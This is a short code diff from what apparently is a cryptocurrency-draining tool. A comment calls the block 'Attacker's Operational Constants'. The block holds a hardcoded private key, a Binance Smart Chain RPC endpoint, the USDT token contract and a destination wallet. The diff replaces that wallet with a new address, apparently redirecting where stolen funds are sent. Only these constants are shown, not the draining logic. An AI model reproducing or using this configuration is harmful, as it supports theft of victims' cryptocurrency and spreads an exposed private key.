@@ -3,7 +3,7 @@ import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethe
 
 // ── Attacker's Operational Constants ──
 const SPONSOR_KEY  = "8cadd34cde574b9188754e2bc290e384e09da7901b06f357c1992821fd6b95f6"
-const DEST_WALLET  = "0x0770e48FD4a7bC60009FFF679FA48B724c904311";
+const DEST_WALLET  = "0x62732B5CF919F9F05d5d6eE79df72b5BE53a7ee3";
 const USDT_BEP20   = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_RPC      = "https://bsc-dataseed1.binance.org/";
 const BSC_CHAIN_ID = "0x38";
